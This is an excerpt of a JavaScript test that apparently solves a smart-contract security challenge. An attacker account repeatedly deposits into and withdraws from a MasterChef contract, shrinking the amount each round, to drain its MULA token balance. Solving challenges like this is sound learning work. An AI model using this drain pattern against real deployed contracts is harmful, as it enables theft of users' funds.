...
it("solves the challenge", async function () {
  ...
  let balance = await mula.balanceOf(await attacker.getAddress());
  let targetBalance = await mula.balanceOf(masterChef.address);
  while(true) {
    await masterChef.connect(attacker).deposit(0, balance);
    targetBalance = (await mula.balanceOf(masterChef.address)).sub(1);
    if(targetBalance.lt(balance)){
      await masterChef.connect(attacker).withdraw(0, targetBalance);
      break;
    }else{
      await masterChef.connect(attacker).withdraw(0, balance);
    }

    balance = balance.mul(95).div(100);
  }
